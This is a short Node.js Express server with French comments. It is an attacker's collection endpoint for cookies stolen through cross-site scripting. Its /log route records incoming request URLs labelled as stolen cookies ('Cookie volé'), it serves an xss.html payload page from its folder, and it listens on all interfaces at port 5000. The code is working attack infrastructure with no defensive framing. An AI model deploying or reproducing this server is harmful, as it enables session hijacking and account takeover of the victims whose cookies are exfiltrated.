const express = require('express');
const path = require('path');
const app = express();

// Route pour logger les cookies volés
app.get('/log', (req, res) => {
  console.log('[+] Cookie volé:', req.url);
  res.send('Cookie reçu, merci !');
});

// Sert tous les fichiers statiques du dossier où est ton xss.html
app.use(express.static(path.join(__dirname))); // ici, __dirname = dossier où est ton serveur

// Ou tu peux être plus précis si ton xss.html est dans un sous-dossier :
// app.use(express.static(path.join(__dirname, 'xss-server')));


app.listen(5000, '0.0.0.0', () => {
  console.log('Serveur de logs démarré sur http://0.0.0.0:5000');
});
